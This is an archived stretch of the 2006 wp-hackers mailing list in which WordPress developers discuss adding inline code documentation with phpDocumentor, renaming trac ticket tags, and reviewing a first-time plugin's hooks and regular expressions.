> probably the last stable version (2.0.1) until this work is finished.
> The reason being, it would be nice, for once, to actually make USE of
> version control by opening things up to more than 2-3 people, get the
> work done fast, and then merge back the changes when the documentation
> is mature enough.

Hm, that would certainly speed things up.  I still think WP in  
general would benefit by having one or two more people who commit  
regularly.

Anyway, I'm going to look into the OO/non-OO and multiple classes per  
file issue... see how PHPXref handles that.  If anyone has any  
information on that, please chime in.

--
Mark Jaquith
http://txfx.net/


From sam at rephrase.net  Thu Feb 16 05:11:03 2006
From: sam at rephrase.net (Sam Angove)
Date: Thu Feb 16 05:12:50 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
References: <43F33C8D.2010509@rcbowen.com>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net> <43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
Message-ID: <aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>

On 2/16/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
>
> Anyway, I'm going to look into the OO/non-OO and multiple classes per
> file issue... see how PHPXref handles that.  If anyone has any
> information on that, please chime in.

For your own sanity, do not look inside phpxref.pl.

Also, try phpDocumentor (phpdoc.org) over PHPDoc (phpdoc.de). I ran it
on WordPress last week, and other than spitting a bunch of warnings
about missing docblocks it worked fine. It seems to deal perfectly
with multiple classes per file.
From mark.wordpress at txfx.net  Thu Feb 16 05:13:36 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb 16 05:15:28 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net>
	<43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
Message-ID: <C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>

On Feb 16, 2006, at 12:11 AM, Sam Angove wrote:

> Also, try phpDocumentor (phpdoc.org) over PHPDoc (phpdoc.de). I ran it
> on WordPress last week, and other than spitting a bunch of warnings
> about missing docblocks it worked fine. It seems to deal perfectly
> with multiple classes per file.

Just found that after posting... it seems to be greatly superior!
--
Mark Jaquith
http://txfx.net/


From carthik at gmail.com  Thu Feb 16 05:30:56 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Thu Feb 16 05:32:47 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
References: <43F33C8D.2010509@rcbowen.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net> <43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
Message-ID: <80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>

On 2/16/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> On Feb 16, 2006, at 12:11 AM, Sam Angove wrote:
>
> > Also, try phpDocumentor (phpdoc.org) over PHPDoc (phpdoc.de). I ran it
> > on WordPress last week, and other than spitting a bunch of warnings
> > about missing docblocks it worked fine. It seems to deal perfectly
> > with multiple classes per file.
>
> Just found that after posting... it seems to be greatly superior!

I concur. Man this whole project seems awfully tempting now that I
think about it. phpDocumentor also allows creation of docbook sources
which can then produce downloadable pdf/html developers documentation.
Keeping things up to date will take a team, as will creating it in the
first place. Should take a long long time to write everything up too.

Carthik.
> --
> Mark Jaquith
> http://txfx.net/
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From grijalva at gmail.com  Thu Feb 16 08:48:41 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Thu Feb 16 08:50:31 2006
Subject: [wp-hackers] Looking for input
In-Reply-To: <aa74b1910602152034k25945336lf9b7c5b87615d36d@mail.gmail.com>
References: <a0159cd30602151743v6f7fa842k580c0aa08a6e2577@mail.gmail.com>
	<aa74b1910602152034k25945336lf9b7c5b87615d36d@mail.gmail.com>
Message-ID: <a0159cd30602160048h530cdad0m36e361fd1217b088@mail.gmail.com>

Hey, thanks for the feedback.  This is my first wp plugin so I'm still
learning all the hooks and whatnot.  I'll definitely incorporate these
suggestions in the next rev.

-dave

On 2/15/06, Sam Angove <sam@rephrase.net> wrote:
>
> On 2/16/06, Dave Grijalva <grijalva@gmail.com> wrote:
> > I don't know if this is the right place to ask this, but I've been
> working
> > on a wordpress plugin and I'm looking for some testers/feedback from
> other
> > wp hackers.  Anyway, the url is
> > http://theblogthatnoonereads.tunasoft.com/coralize/
>
> That looks like a great plugin. A few things from browsing the source:
>
> * `wp_head` is a really bad hook to put `coralize_site()` on, since
> it's theme-dependent and called very late. Maybe `plugins_loaded` or
> `init`.
>
> * For the blacklist regex, you can use negative lookahead. Something like:
>
>     (<img\s+.*?src="http://(?!(example.com|example.net)).*?)(/.*?".*?>)
>
> * Single quotes are also valid for HTML attributes, but the plugin
> only matches double quotes.
>
> * Is there some reason I don't see to use `coralize_preg_domain()`
> instead of PHP's `preg_quote()`?
>
> * Just for general readability, you don't need to backslash-escape
> nearly so much in the regular expressions, especially if you use
> something other than forward-slash as the delimiter.
>
> :)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From grijalva at gmail.com  Thu Feb 16 09:35:48 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Thu Feb 16 09:37:37 2006
Subject: [wp-hackers] Looking for input
In-Reply-To: <a0159cd30602160048h530cdad0m36e361fd1217b088@mail.gmail.com>
References: <a0159cd30602151743v6f7fa842k580c0aa08a6e2577@mail.gmail.com>
	<aa74b1910602152034k25945336lf9b7c5b87615d36d@mail.gmail.com>
	<a0159cd30602160048h530cdad0m36e361fd1217b088@mail.gmail.com>
Message-ID: <a0159cd30602160135l4e2ee3c9rf65fff93518d192a@mail.gmail.com>

I went ahead and applied some of the changes you suggested.  I'm still gonna
have to go back and cleanup some of the expressions, but I did manage to get
blacklisting working thanks to your suggestion.

I updated the expressions to allow " and ' for html attributes.

Also, I changed the coralize_site() hook to 'init'.

Please test out the new version if you have a few minutes.
thanks again for the help.

-dave

On 2/16/06, Dave Grijalva <grijalva@gmail.com> wrote:
>
> Hey, thanks for the feedback.  This is my first wp plugin so I'm still
> learning all the hooks and whatnot.  I'll definitely incorporate these
> suggestions in the next rev.
>
> -dave
>
> On 2/15/06, Sam Angove <sam@rephrase.net> wrote:
> >
> > On 2/16/06, Dave Grijalva <grijalva@gmail.com> wrote:
> > > I don't know if this is the right place to ask this, but I've been
> > working
> > > on a wordpress plugin and I'm looking for some testers/feedback from
> > other
> > > wp hackers.  Anyway, the url is
> > > http://theblogthatnoonereads.tunasoft.com/coralize/
> >
> > That looks like a great plugin. A few things from browsing the source:
> >
> > * `wp_head` is a really bad hook to put `coralize_site()` on, since
> > it's theme-dependent and called very late. Maybe `plugins_loaded` or
> > `init`.
> >
> > * For the blacklist regex, you can use negative lookahead. Something
> > like:
> >
> >     (<img\s+.*?src="http://(?!(example.com|example.net)).*?)(/.*?".*?>)
> >
> > * Single quotes are also valid for HTML attributes, but the plugin
> > only matches double quotes.
> >
> > * Is there some reason I don't see to use `coralize_preg_domain()`
> > instead of PHP's `preg_quote()`?
> >
> > * Just for general readability, you don't need to backslash-escape
> > nearly so much in the regular expressions, especially if you use
> > something other than forward-slash as the delimiter.
> >
> > :)
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
From skeltoac at gmail.com  Thu Feb 16 12:58:23 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Feb 16 13:00:12 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net> <43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
Message-ID: <e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>

I hope nobody minds my saying that this thread is a shining example of
community effort. Excellent work, all!

To add my two cents, I'll say that the ZDE has done wonders for the
way I work with PHP code and I recommend buying it if you can justify
the cost. I look forward to seeing function specifics pop up when I'm
typing WordPress functions in the editor!

If anyone writing comments finds some code they can't decypher or
needs help explaining something, send me a note off-list and I'll see
what I can do to help.

Cheers,
Andy
From lists at abhaykumar.net  Thu Feb 16 13:10:40 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Thu Feb 16 13:12:31 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com> <43F3CE5D.7080907@ebroder.net>
	<43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
Message-ID: <512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>

Are we splitting this up in some sort of clear fashion?

I suggest a wiki page with the entire file list.

- Abhay

On 2/16/06, Andy Skelton <skeltoac@gmail.com> wrote:
> I hope nobody minds my saying that this thread is a shining example of
> community effort. Excellent work, all!
>
> To add my two cents, I'll say that the ZDE has done wonders for the
> way I work with PHP code and I recommend buying it if you can justify
> the cost. I look forward to seeing function specifics pop up when I'm
> typing WordPress functions in the editor!
>
> If anyone writing comments finds some code they can't decypher or
> needs help explaining something, send me a note off-list and I'll see
> what I can do to help.
>
> Cheers,
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Abhay Kumar
http://abhaykumar.net/
From carthik at gmail.com  Thu Feb 16 13:46:09 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Thu Feb 16 13:47:57 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
Message-ID: <80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>

On 2/16/06, Abhay Kumar <lists@abhaykumar.net> wrote:
> Are we splitting this up in some sort of clear fashion?
>
Yes we should be.
Issues remaining are:
1) Writing a howto or a standards document describing followed norms
and standards
2) Choosing the doc format/tool to use - phpDocumentor seems to be the best bet
3) Creating an svn repo for this effort - Can Matt/WP.com help with
hosting this?
4) Choosing a project lead/coordinator - Mark (txfx.net) - are you up
for it? Other volunteers?

> I suggest a wiki page with the entire file list.
Can use a seperate trac instance for creating the documentation on its
associated wiki.

Now is the time to encourage this effort - while it still has some steam :)

Carthik.
> - Abhay
>
> On 2/16/06, Andy Skelton <skeltoac@gmail.com> wrote:
> > I hope nobody minds my saying that this thread is a shining example of
> > community effort. Excellent work, all!
> >
> > To add my two cents, I'll say that the ZDE has done wonders for the
> > way I work with PHP code and I recommend buying it if you can justify
> > the cost. I look forward to seeing function specifics pop up when I'm
> > typing WordPress functions in the editor!
> >
> > If anyone writing comments finds some code they can't decypher or
> > needs help explaining something, send me a note off-list and I'll see
> > what I can do to help.
> >
> > Cheers,
> > Andy
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> --
> Abhay Kumar
> http://abhaykumar.net/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From skippy at skippy.net  Thu Feb 16 13:46:53 2006
From: skippy at skippy.net (Scott Merrill)
Date: Thu Feb 16 13:48:24 2006
Subject: [wp-hackers] trac tags
Message-ID: <43F4824D.8050005@skippy.net>

A brief discussion at the IRC meetup last night confirmed that the
bg|commit tag is useful to Ryan when making commits to the code.

In a similar vein, the list of commit candidates (trac report #9) was
modified to provide a chronological view of tickets, rather than a list
grouped by owner.

Finally, it was tentatively agreed that the bg| prefix from tags can
reasonably be dropped.  We can collectively make an effort to remove the
 bg| prefix from all current _open_ tickets, and then modify the reports
as needed.  I figure if everyone chips and and modifies a dozen or so
tickets, we could be done in a day or two.

Cheers,
Scott

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From mark.wordpress at txfx.net  Thu Feb 16 13:52:48 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb 16 13:54:38 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <43F4824D.8050005@skippy.net>
References: <43F4824D.8050005@skippy.net>
Message-ID: <9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>

On Feb 16, 2006, at 8:46 AM, Scott Merrill wrote:

> Finally, it was tentatively agreed that the bg| prefix from tags can
> reasonably be dropped.  We can collectively make an effort to  
> remove the
>  bg| prefix from all current _open_ tickets, and then modify the  
> reports
> as needed.  I figure if everyone chips and and modifies a dozen or so
> tickets, we could be done in a day or two.

I'm modifying the reports now.  No harm in this, as LIKE '%commit%'  
will match "bg|commit" as well as "commit", so this can be a seamless  
change.

--
Mark Jaquith
http://txfx.net/


From dmhouse at gmail.com  Thu Feb 16 13:52:47 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb 16 13:54:41 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <43F4824D.8050005@skippy.net>
References: <43F4824D.8050005@skippy.net>
Message-ID: <ebe43d680602160552m75b9e520x@mail.gmail.com>

On 16/02/06, Scott Merrill <skippy@skippy.net> wrote:
> Finally, it was tentatively agreed that the bg| prefix from tags can
> reasonably be dropped.  We can collectively make an effort to remove the
>  bg| prefix from all current _open_ tickets, and then modify the reports
> as needed.  I figure if everyone chips and and modifies a dozen or so
> tickets, we could be done in a day or two.

Quickly wondering why we might want to do this? I kinda like the
namespacing, it seperates the meta tags from the actual tags, so to
speak.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From skippy at skippy.net  Thu Feb 16 13:56:28 2006
From: skippy at skippy.net (Scott Merrill)
Date: Thu Feb 16 13:57:57 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <ebe43d680602160552m75b9e520x@mail.gmail.com>
References: <43F4824D.8050005@skippy.net>
	<ebe43d680602160552m75b9e520x@mail.gmail.com>
Message-ID: <43F4848C.9010604@skippy.net>

David House wrote:
> On 16/02/06, Scott Merrill <skippy@skippy.net> wrote:
>> Finally, it was tentatively agreed that the bg| prefix from tags can
>> reasonably be dropped.  We can collectively make an effort to remove the
>>  bg| prefix from all current _open_ tickets, and then modify the reports
>> as needed.  I figure if everyone chips and and modifies a dozen or so
>> tickets, we could be done in a day or two.
> 
> Quickly wondering why we might want to do this? I kinda like the
> namespacing, it seperates the meta tags from the actual tags, so to
> speak.

Since more hands are touching trac, it makes some sense to drop the bg|
prefix to something more easily understood.  "bg|" stood for "Bug
Gardener", and was a token used by us to quickly put some sense to the
jungle of tickets.  The notion of "bug gardener" has diminished
somewhat, with the influx of trac participation, so removing that prefix
seems to make some sense.

But hey, if the majority wants to keep it, I won't care.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From dmhouse at gmail.com  Thu Feb 16 13:56:15 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb 16 13:58:17 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>
References: <43F4824D.8050005@skippy.net>
	<9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>
Message-ID: <ebe43d680602160556saa0dfb9w@mail.gmail.com>

On 16/02/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> I'm modifying the reports now.  No harm in this, as LIKE '%commit%'
> will match "bg|commit" as well as "commit", so this can be a seamless
> change.

This is going to wreak havoc with my wp-trac inbox... :)

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From mark.wordpress at txfx.net  Thu Feb 16 14:01:46 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb 16 14:03:39 2006
Subject: [wp-hackers] trac tags
In-Reply-To: <ebe43d680602160556saa0dfb9w@mail.gmail.com>
References: <43F4824D.8050005@skippy.net>
	<9EA9F3DF-5010-4E29-9306-D3974FD0620E@txfx.net>
	<ebe43d680602160556saa0dfb9w@mail.gmail.com>
Message-ID: <45B4BB3D-D449-4E1C-86FD-2D9FC8C0507F@txfx.net>

On Feb 16, 2006, at 8:56 AM, David House wrote:

> This is going to wreak havoc with my wp-trac inbox... :)

You know, there's really no reason to go back and change the old  
ones.  They'll still be picked up by the reports, which is what  
really matters.  I wasn't at the meetup (have a conflict with the  
time, unfortunately), but I've definitely noticed Matt and Ryan both  
making use of the commit report.
--
Mark Jaquith
http://txfx.net/


From mark.wordpress at txfx.net  Thu Feb 16 14:20:59 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb 16 14:22:50 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
Message-ID: <116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>

On Feb 16, 2006, at 8:46 AM, Carthik Sharma wrote:

> Issues remaining are:
> 1) Writing a howto or a standards document describing followed norms
> and standards
> 2) Choosing the doc format/tool to use - phpDocumentor seems to be  
> the best bet
> 3) Creating an svn repo for this effort - Can Matt/WP.com help with
> hosting this?
> 4) Choosing a project lead/coordinator - Mark (txfx.net) - are you up
> for it? Other volunteers?

We still need word from Matt or Ryan that this is the sort of thing  
that they'd put into WP.  I think it sounds worthwhile, and I'd  
certainly like to help, but I don't have commit access, so it's not  
my call whether or not it goes in.

 From the Meetup logs from last night:

> [19:35] <SteamedPenguin> rboren: so something like var listing and  
> var typing would not go in?
[...]
> [19:36] <rboren> SteamedPenguin: I wouldn't right now, but we can  
> discuss on the hackers list and see where people fall.

So we still need to make a case for this.  If there are any silently  
agreeing lurkers, now is the time to voice your support.

Andy brought up an opposing argument (playing devil's advocate):

> [19:37] <skeltoac> The major argument I see opposed to extensive  
> commenting is that it takes time to review them.
> [19:38] <SteamedPenguin> skeltoac: a fair ammount of function  
> description can come straight out of the codex.
> [19:38] <SteamedPenguin> at least where template tags are concerned
> [19:40] <SteamedPenguin> skeltoac: since that stuff has the most  
> eyeballs it ought to be the first target for inline commenting as  
> well as the easiest to accomplish
> [19:40] <SteamedPenguin> making template tags a good test case, IMO

... and deconstructed it fairly well.

> [19:42] <skeltoac> You can always upload patches and ask for peer  
> review. If you have a good set of comments and they've been okayed  
> by a number of devs, Ryan doesn't have to spend his day reading  
> them over.

There are several people who, while they don't have commit access,  
get a certain amount of leeway when it comes to the patches they  
submit or recommend for commit.  I'd expect that these sorts of  
commits (that only consist of PHP comments) would get even more  
leeway, as they're not going to break anything.

We could work on patches amongst ourselves, and then when we think  
they're ready to go we could have 2 or 3 people sign off on it and  
send it off with a "commit" tag.

--
Mark Jaquith
http://txfx.net/


From dmhouse at gmail.com  Thu Feb 16 14:27:04 2006
From: dmhouse at gmail.com (David House)
Date: Thu Feb 16 14:29:05 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
Message-ID: <ebe43d680602160627w1d5ac4f1l@mail.gmail.com>

On 16/02/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> We could work on patches amongst ourselves, and then when we think
> they're ready to go we could have 2 or 3 people sign off on it and
> send it off with a "commit" tag.

That's what bug gardeners are for, right? :)

I'll bg|commit any of these patches as long as the commenting isn't
overboard. My personal commenting policy is one line before each
function (plus other places within the function, but I think we are
mainly deailing with the former type in this thread). If the
parameters names aren't self explanatory, then perhaps a short
sentence explaining their purpose, but nothing > 3 lines in total.

Short and sweet. This ain't the codex.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From carthik at gmail.com  Thu Feb 16 15:15:53 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Thu Feb 16 15:17:41 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
	<A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>
	<aa74b1910602152111n7d22a64eh89dce1eec35d30e6@mail.gmail.com>
	<C139869D-18D1-4C8D-ADDC-1CA147C93B60@txfx.net>
	<80f75db0602152130h2bb63918w496035be07bc7264@mail.gmail.com>
	<e6ec604d0602160458j7086ea27wcd3104e0f8abff4a@mail.gmail.com>
	<512061b90602160510i104f16f7w90d63222da0c5fda@mail.gmail.com>
	<80f75db0602160546ja9342bfq3df489822c24b8f@mail.gmail.com>
	<116ABCF9-6824-4ED3-BA60-897A1F23B3E3@txfx.net>
Message-ID: <80f75db0602160715o5a0f44b1g9c335076c349773a@mail.gmail.com>

On 2/16/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> On Feb 16, 2006, at 8:46 AM, Carthik Sharma wrote:
>
> > Issues remaining are:
> > 1) Writing a howto or a standards document describing followed norms
> > and standards
> > 2) Choosing the doc format/tool to use - phpDocumentor seems to be
> > the best bet
> > 3) Creating an svn repo for this effort - Can Matt/WP.com help with
> > hosting this?
> > 4) Choosing a project lead/coordinator - Mark (txfx.net) - are you up
> > for it? Other volunteers?
>
> We still need word from Matt or Ryan that this is the sort of thing
> that they'd put into WP.  I think it sounds worthwhile, and I'd
> certainly like to help, but I don't have commit access, so it's not
> my call whether or not it goes in.
>
>  From the Meetup logs from last night:
>
> > [19:35] <SteamedPenguin> rboren: so something like var listing and
> > var typing would not go in?
> [...]
> > [19:36] <rboren> SteamedPenguin: I wouldn't right now, but we can
> > discuss on the hackers list and see where people fall.
>
> So we still need to make a case for this.  If there are any silently
> agreeing lurkers, now is the time to voice your support.
>
> Andy brought up an opposing argument (playing devil's advocate):
>
> > [19:37] <skeltoac> The major argument I see opposed to extensive
> > commenting is that it takes time to review them.
> > [19:38] <SteamedPenguin> skeltoac: a fair ammount of function
> > description can come straight out of the codex.
> > [19:38] <SteamedPenguin> at least where template tags are concerned
> > [19:40] <SteamedPenguin> skeltoac: since that stuff has the most
> > eyeballs it ought to be the first target for inline commenting as
> > well as the easiest to accomplish
> > [19:40] <SteamedPenguin> making template tags a good test case, IMO
>
> ... and deconstructed it fairly well.
>
> > [19:42] <skeltoac> You can always upload patches and ask for peer
> > review. If you have a good set of comments and they've been okayed
> > by a number of devs, Ryan doesn't have to spend his day reading
> > them over.
>
> There are several people who, while they don't have commit access,
> get a certain amount of leeway when it comes to the patches they
> submit or recommend for commit.  I'd expect that these sorts of
> commits (that only consist of PHP comments) would get even more
> leeway, as they're not going to break anything.
>
> We could work on patches amongst ourselves, and then when we think
> they're ready to go we could have 2 or 3 people sign off on it and
> send it off with a "commit" tag.
>

This is why I suggested working on a seperate copy of the core code
and then the decision to merge changes into the core can be made at a
later dat, when the contributions are sufficiently mature and
verified. People can still use the concurrent documentation repo's
sources for development/information in the meantime - nothing to stop
them from doing that.

Carthik.
> --
> Mark Jaquith
> http://txfx.net/
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From rbowen at rcbowen.com  Thu Feb 16 18:19:09 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Thu Feb 16 18:20:59 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>	<43F373EB.7000505@atl.lmco.com>	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>	<43F3805C.2060305@skippy.net>	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
Message-ID: <43F4C21D.2070702@rcbowen.com>

Dave Grijalva wrote:
> A possible solution, I think someone mentioned this earlier, would be to
> keep inline documentation in the svn version, and strip it from the source
> when preparing a release version.

A solution to *what*, exactly? Having comments in code does *NOT* cause
execution overhead. We're not talking about doubling the size of files.
We're talking about a few lines of comments. I think you're trying to
solve a problem that doesn't exist.

-- 
